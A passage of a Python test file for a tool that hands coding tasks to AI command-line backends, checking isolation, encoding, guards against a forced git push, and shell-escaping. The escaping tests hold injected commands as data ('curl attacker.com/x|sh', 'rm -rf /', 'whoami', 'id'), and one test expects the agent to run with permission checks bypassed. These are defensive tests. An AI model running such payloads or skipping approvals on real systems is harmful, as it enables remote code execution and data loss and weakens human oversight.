    assert result["execution_result"]["changed_files"] == ["app/main.py"]
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_codex_cli_forces_utf8_subprocess_decoding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)
    seen: dict[str, Any] = {}

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        seen["command"] = command
        seen["kwargs"] = kwargs
        source_file.write_text("def handler():\n    return 2\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    # Disable isolation so the fake subprocess can write directly to project_root.
    monkeypatch.setenv("WORKFLOW_CODEX_ISOLATION", "0")
    monkeypatch.setattr(execution_codex_cli.shutil, "which", lambda name: "codex" if name == "codex" else None)
    monkeypatch.setattr(execution_codex_cli.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="codex_cli",
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert seen["kwargs"]["text"] is True
    assert seen["kwargs"]["encoding"] == "utf-8"
    assert seen["kwargs"]["errors"] == "replace"


def test_run_execution_backend_codex_cli_dispatches_through_registry(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    called: dict[str, Any] = {}

    def _fake_registered_runner(backend: str, *, invocation: Any) -> dict[str, Any] | None:
        called["backend"] = backend
        called["invocation_task"] = invocation.task
        if backend != execution_backend.CODEX_CLI_BACKEND:
            return None
        return execution_artifacts.build_execution_result(
            feature=invocation.config.feature,
            task=invocation.task,
            backend=execution_backend.CODEX_CLI_BACKEND,
            status="PASS",
            changed_files=["app/main.py"],
            summary="registry codex runner",
        )

    monkeypatch.setattr(execution_artifacts, "run_registered_execution_backend", _fake_registered_runner)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="codex_cli",
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert called["backend"] == execution_backend.CODEX_CLI_BACKEND
    assert called["invocation_task"] == "T1: implement"
    assert result["status"] == "done"
    assert result["execution_result"]["backend"] == "codex_cli"
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_codex_cli_blocks_when_only_out_of_scope_files_change(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    out_of_scope_file = project_root / "README.md"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    out_of_scope_file.write_text("baseline\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        del command, kwargs
        out_of_scope_file.write_text("changed out of scope\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="codex ok", stderr="")

    monkeypatch.setattr(execution_codex_cli.shutil, "which", lambda name: "codex" if name == "codex" else None)
    monkeypatch.setattr(execution_codex_cli.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="codex_cli",
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "blocked"
    assert result["reason"] == "CODEX_CLI_CHANGED_FILES_MISSING"
    assert result["execution_result"]["changed_files"] == []
    assert (planning_dir / ".execution_result.json").exists()


def _argument_choices(command: str, option: str) -> list[str]:
    from kodawari.cli.main import build_parser

    parser = build_parser()
    subparsers = next(
        action
        for action in parser._actions
        if isinstance(action, argparse._SubParsersAction)
    )
    command_parser = subparsers.choices[command]
    target = next(action for action in command_parser._actions if option in action.option_strings)
    return list(target.choices or [])


def test_execution_backend_choices_are_single_source_for_cli() -> None:
    expected_executor = execution_backend.execution_backend_choices()
    expected_self_review = execution_backend.self_review_backend_choices()

    assert _argument_choices("autopilot", "--executor-backend") == expected_executor
    assert _argument_choices("autopilot", "--self-review-backend") == expected_self_review
    assert _argument_choices("task-run", "--executor-backend") == expected_executor
    assert _argument_choices("task-run", "--self-review-backend") == expected_self_review
    assert execution_backend.CLAUDE_CODE_BACKEND in expected_executor
    assert execution_backend.CLAUDE_CODE_BACKEND not in expected_self_review


def test_runtime_commands_expose_rollback_retry_arguments() -> None:
    from kodawari.cli.main import build_parser

    parser = build_parser()

    autopilot_args = parser.parse_args(
        [
            "autopilot",
            "--project-root",
            ".",
            "--feature",
            "demo",
            "--rollback-on-failure",
            "--max-verify-retries",
            "3",
        ]
    )
    work_args = parser.parse_args(
        [
            "work",
            "--project-root",
            ".",
            "--feature",
            "demo",
            "--rollback-on-failure",
            "--max-verify-retries",
            "4",
        ]
    )
    task_run_args = parser.parse_args(
        [
            "task-run",
            "--project-root",
            ".",
            "--feature",
            "demo",
            "--card",
            "TASK_CARD.json",
            "--rollback-on-failure",
            "--max-verify-retries",
            "5",
        ]
    )

    assert autopilot_args.rollback_on_failure is True
    assert autopilot_args.max_verify_retries == 3
    assert work_args.rollback_on_failure is True
    assert work_args.max_verify_retries == 4
    assert task_run_args.rollback_on_failure is True
    assert task_run_args.max_verify_retries == 5


def test_run_execution_backend_claude_code_success(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        del command
        execution_root = Path(str(kwargs.get("cwd") or ""))
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 2\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: "claude" if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    request_payload = json.loads((planning_dir / ".execution_request.json").read_text(encoding="utf-8"))
    assert request_payload["backend"] == "claude_code"
    assert request_payload["backend_capabilities"]["implemented"] is True
    assert request_payload["backend_capabilities"]["maturity"] == "beta"
    assert result["status"] == "done"
    assert result["execution_backend"] == "claude_code"
    assert result["execution_backend_capabilities"]["implemented"] is True
    assert result["execution_result"]["status"] == "PASS"
    assert result["execution_result"]["changed_files"] == ["app/main.py"]
    assert result["execution_result"]["host_probe"]["status"] == "ready"
    assert source_file.read_text(encoding="utf-8").strip().endswith("return 2")
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_claude_code_passes_model_to_cli(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)
    captured: dict[str, Any] = {}

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        captured["command"] = list(command)
        execution_root = Path(str(kwargs.get("cwd") or ""))
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 2\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: "claude" if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
            model="sonnet4.6",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert captured["command"][-2:] == ["--model", "sonnet4.6"]


def test_run_execution_backend_claude_code_sets_workspace_runtime_home(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)
    captured: dict[str, Any] = {}

    monkeypatch.setattr(execution_claude_code.os, "name", "nt", raising=False)
    monkeypatch.setenv("USERPROFILE", "C:\\Users\\blocked-home")

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        captured["command"] = list(command)
        captured["env"] = dict(kwargs.get("env") or {})
        execution_root = Path(str(kwargs.get("cwd") or "")).resolve()
        captured["execution_root"] = execution_root
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 2\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(
        execution_claude_code,
        "_probe_home_accessibility",
        lambda **_: {"status": "ready", "home": "C:\\Users\\allowed"},
    )
    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: "claude" if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    env = dict(captured.get("env") or {})
    execution_root = Path(str(captured.get("execution_root") or "")).resolve()
    assert env.get("HOME"), "claude child env must include HOME"
    assert env.get("USERPROFILE"), "claude child env must include USERPROFILE"
    assert Path(str(env["HOME"])).resolve().is_relative_to(execution_root)
    assert Path(str(env["USERPROFILE"])).resolve().is_relative_to(execution_root)
    assert env["USERPROFILE"] != "C:\\Users\\blocked-home"


def test_run_execution_backend_claude_code_compact_context_is_consumed_into_prompt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)
    (planning_dir / "semantic_compact.json").write_text(
        json.dumps(
            {
                "decisions": [
                    {
                        "decision": "keep single source of truth",
                        "rationale": "avoid drift",
                        "constraints": ["db.rankings", "no cache bypass"],
                    }
                ],
                "constraints": ["do not touch frontend"],
                "recent_errors": [{"category": "verify", "phase": "review", "message": "missing scoped test"}],
                "must_fix": ["add scoped test"],
                "open_questions": ["should ranking fallback return empty array?"],
            }
        ),
        encoding="utf-8",
    )
    captured: dict[str, Any] = {}

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        captured["command"] = command
        captured["input"] = kwargs.get("input", "")
        captured["cwd"] = str(kwargs.get("cwd") or "")
        execution_root = Path(str(kwargs.get("cwd") or ""))
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 2\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: "claude" if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    command = list(captured["command"])
    assert Path(str(command[0])).name.lower().startswith("claude")
    assert "-p" in command
    assert "--permission-mode" in command
    assert "bypassPermissions" in command
    assert "--dangerously-skip-permissions" in command
    # Prompt is now passed via stdin (not as last argv), check captured["input"]
    prompt = str(captured.get("input") or "")
    assert "Kernel-level compact context injection" in prompt
    assert "keep single source of truth" in prompt
    assert "do not touch frontend" in prompt
    assert "missing scoped test" in prompt
    assert "add scoped test" in prompt
    assert "open_questions:" in prompt
    assert "Execution workspace:" in prompt


def test_run_execution_backend_claude_code_override_is_backend_fail_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    called = {"subprocess": False}

    def _forbidden_subprocess(command: Any, **kwargs: Any) -> Any:
        del command, kwargs
        called["subprocess"] = True
        raise AssertionError("subprocess.run should not execute when claude backend preflight guard blocks")

    monkeypatch.setattr(execution_artifacts, "_evaluate_dispatch_guard", lambda **kwargs: None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _forbidden_subprocess)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="git push --force origin main",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T2: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T2",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert called["subprocess"] is False
    assert result["status"] == "blocked"
    assert result["reason"] == "EXECUTION_GUARD_DENY"
    assert result["execution_result"]["guard_action"] == "deny"
    assert result["execution_result"]["guard_command"] == "git push --force origin main"
    assert result["execution_result"]["host_probe"]["status"] == "degraded"
    assert result["execution_result"]["host_probe"]["reason"] == "command_override"


def test_run_execution_backend_claude_code_uses_directory_isolation_and_syncs_back(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    captured: dict[str, Any] = {}

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        del command
        execution_cwd = Path(str(kwargs.get("cwd") or ""))
        captured["cwd"] = str(execution_cwd)
        captured["project_root"] = str(project_root)
        assert execution_cwd != project_root
        assert str(execution_cwd).startswith(str((planning_dir / ".parallel_workers").resolve()))
        isolated_file = execution_cwd / "app" / "main.py"
        assert isolated_file.exists()
        assert source_file.read_text(encoding="utf-8").strip().endswith("return 1")
        isolated_file.write_text("def handler():\n    return 99\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: "claude" if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T3: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T3",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert result["execution_result"]["changed_files"] == ["app/main.py"]
    assert source_file.read_text(encoding="utf-8").strip().endswith("return 99")


def test_run_execution_backend_claude_code_blocks_when_binary_is_missing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: None)
    monkeypatch.setattr(execution_claude_code, "_resolve_windows_executable", lambda executable: None)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "blocked"
    assert result["reason"] == "CLAUDE_CODE_MISSING"
    assert result["execution_result"]["host_probe"]["status"] == "blocked"
    assert result["execution_result"]["host_probe"]["reason"] == "executable_unavailable"
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_claude_code_uses_resolved_windows_wrapper_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    captured: dict[str, Any] = {}
    wrapper_file = tmp_path / "bin" / "claude.CMD"
    wrapper_file.parent.mkdir(parents=True, exist_ok=True)
    wrapper_file.write_text("@echo off\r\necho Claude Code\r\n", encoding="utf-8")
    wrapper_path = str(wrapper_file)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        captured["command"] = list(command)
        execution_root = Path(str(kwargs.get("cwd") or ""))
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 7\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: wrapper_path if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert captured["command"][0] == wrapper_path


def test_run_execution_backend_claude_code_resolves_windows_cmd_wrapper_when_shutil_which_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    captured: dict[str, Any] = {}
    wrapper_file = tmp_path / "bin" / "claude.cmd"
    wrapper_file.parent.mkdir(parents=True, exist_ok=True)
    wrapper_file.write_text("@echo off\r\necho Claude Code\r\n", encoding="utf-8")

    monkeypatch.setenv("PATH", str(wrapper_file.parent))
    monkeypatch.setenv("PATHEXT", ".CMD;.EXE")
    monkeypatch.setattr(execution_claude_code.os, "name", "nt", raising=False)
    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: None)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        captured["command"] = list(command)
        execution_root = Path(str(kwargs.get("cwd") or ""))
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 4\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="claude ok", stderr="")

    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
            executable="claude",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert Path(captured["command"][0]).name.lower() == wrapper_file.name.lower()
    assert result["execution_result"]["changed_files"] == ["app/main.py"]


def test_claude_backend_native_runtime_proof_without_adapter_shell(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "native-proof"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        del command
        execution_root = Path(str(kwargs.get("cwd") or ""))
        (execution_root / "app").mkdir(parents=True, exist_ok=True)
        (execution_root / "app" / "main.py").write_text("def handler():\n    return 3\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="native ok", stderr="")

    monkeypatch.setattr(execution_claude_code.shutil, "which", lambda name: "claude" if name == "claude" else None)
    monkeypatch.setattr(execution_claude_code.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CLAUDE_CODE_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="native-proof",
            executable="claude",
        ),
        task="T-NATIVE: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T-NATIVE",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert result["execution_backend"] == "claude_code"
    assert result["execution_result"]["status"] == "PASS"
    assert result["execution_result"]["host_probe"]["status"] == "ready"
    assert source_file.read_text(encoding="utf-8").strip().endswith("return 3")


def test_run_execution_backend_codex_cli_blocks_when_binary_is_missing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(execution_codex_cli.shutil, "which", lambda name: None)
    monkeypatch.setattr(execution_codex_cli, "_windows_npm_find", lambda name: None)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="codex_cli",
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "blocked"
    assert result["reason"] == "CODEX_CLI_MISSING"
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_codex_cli_command_override_is_guarded_before_dispatch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    called = {"registry": False}

    def _forbidden_runner(backend: str, *, invocation: Any) -> dict[str, Any] | None:
        del backend, invocation
        called["registry"] = True
        raise AssertionError("registered execution backend should not be called when guard blocks command override")

    monkeypatch.setattr(execution_artifacts, "run_registered_execution_backend", _forbidden_runner)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="codex_cli",
            command="git push --force origin main",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert called["registry"] is False
    assert result["status"] == "blocked"
    assert result["reason"] == "EXECUTION_GUARD_DENY"
    assert result["execution_result"]["guard_action"] == "deny"
    assert result["execution_result"]["guard_command"] == "git push --force origin main"
    assert (planning_dir / ".execution_result.json").exists()


def test_codex_execution_prompt_softens_default_verify_expectation() -> None:
    prompt = execution_codex_cli._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T1: implement",
            "feature": "demo",
            "task_id": "T1",
            "files_to_change": ["app/main.py"],
            "verify_cmd": "pytest -q",
        }
    )

    assert "Verify command expectation:" in prompt
    assert "handled by workflow runtime after implementation" in prompt
    assert "focus on task-local evidence" in prompt


def test_claude_execution_prompt_softens_default_verify_expectation() -> None:
    prompt = execution_claude_code._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T1: implement",
            "feature": "demo",
            "task_id": "T1",
            "files_to_change": ["app/main.py"],
            "verify_cmd": "pytest -q",
        }
    )

    assert "Verify command expectation:" in prompt
    assert "handled by workflow runtime after implementation" in prompt
    assert "focus on task-local evidence" in prompt


class TestRenderOverrideCommandShellEscaping:
    """Verify that payload-sourced values are shell-escaped in command overrides.

    shlex.quote wraps dangerous values in single quotes so that shell
    metacharacters (``$(``, backticks, ``;``, etc.) become literal.
    The tests check that the rendered command contains the quoted form.
    """

    def test_codex_cli_escapes_task_with_shell_metacharacters(self) -> None:
        rendered = execution_codex_cli._render_override_command(  # type: ignore[attr-defined]
            template="codex exec -- {task}",
            project_root=Path("/repo"),
            request_payload={
                "task": "fix bug$(curl attacker.com/x|sh)",
                "files_to_change": [],
            },
            request_path=Path("/repo/req.json"),
        )
        # The dangerous value must be inside single quotes
        assert "'fix bug$(curl attacker.com/x|sh)'" in rendered

    def test_claude_code_escapes_task_with_shell_metacharacters(self) -> None:
        rendered = execution_claude_code._render_override_command(  # type: ignore[attr-defined]
            template="claude -p -- {task}",
            project_root=Path("/repo"),
            execution_root=Path("/workspace"),
            request_payload={
                "task": "test; rm -rf /",
                "files_to_change": [],
            },
            request_path=Path("/repo/req.json"),
        )
        assert "'test; rm -rf /'" in rendered

    def test_codex_cli_escapes_files_with_semicolons(self) -> None:
        rendered = execution_codex_cli._render_override_command(  # type: ignore[attr-defined]
            template="codex exec --files {files}",
            project_root=Path("/repo"),
            request_payload={
                "task": "ok",
                "files_to_change": ["a.py;rm -rf /", "b.py"],
            },
            request_path=Path("/repo/req.json"),
        )
        # The joined files string must be quoted as a single token
        assert "'" in rendered
        assert "a.py;rm -rf /" in rendered  # value preserved but inside quotes

    def test_codex_cli_escapes_archetype_and_surface(self) -> None:
        rendered = execution_codex_cli._render_override_command(  # type: ignore[attr-defined]
            template="run --archetype {archetype} --surface {surface}",
            project_root=Path("/repo"),
            request_payload={
                "task": "ok",
                "files_to_change": [],
                "task_card": {
                    "archetype": "bug`whoami`",
                    "surface": "api$(id)",
                },
            },
            request_path=Path("/repo/req.json"),
        )
        assert "'bug`whoami`'" in rendered
        assert "'api$(id)'" in rendered

    def test_path_values_are_not_quoted(self) -> None:
        """project_root and request_path are operator-controlled, not quoted."""
        rendered = execution_codex_cli._render_override_command(  # type: ignore[attr-defined]
            template="run --root {project_root} --req {request_path}",
            project_root=Path("/my/repo"),
            request_payload={"task": "ok", "files_to_change": []},
            request_path=Path("/my/repo/req.json"),
        )
        # Path values should appear without single-quote wrapping
        root_str = str(Path("/my/repo"))
        assert root_str in rendered
        assert f"'{root_str}'" not in rendered


class TestClassifyCliFailure:
    # The Claude CLI is a Node process; on Windows its filesystem errors
    # surface as errno codes (`code: 'EPERM'`, `lstat` on a home-dir
    # path) rather than as Python PermissionError text. The classifier
    # must bucket these as permission_error so operators can tell a
    # Windows-permission problem apart from a generic crash.
    def test_eperm_on_lstat_is_permission_error(self) -> None:
        stderr = (
            "Error: EPERM: operation not permitted, lstat 'C:\\\\Users\\\\liafei'\n"
            "    at Object.lstatSync (node:fs:1657:3)\n"
            "  errno: -4048,\n"
            "  code: 'EPERM',\n"
            "  syscall: 'lstat'\n"
        )
        assert (
            execution_claude_code._classify_cli_failure(stderr, "")  # type: ignore[attr-defined]
            == "permission_error"
        )

    def test_enoent_is_file_not_found(self) -> None:
        stderr = "Error: ENOENT: no such file or directory, open '/tmp/missing'"
        assert (
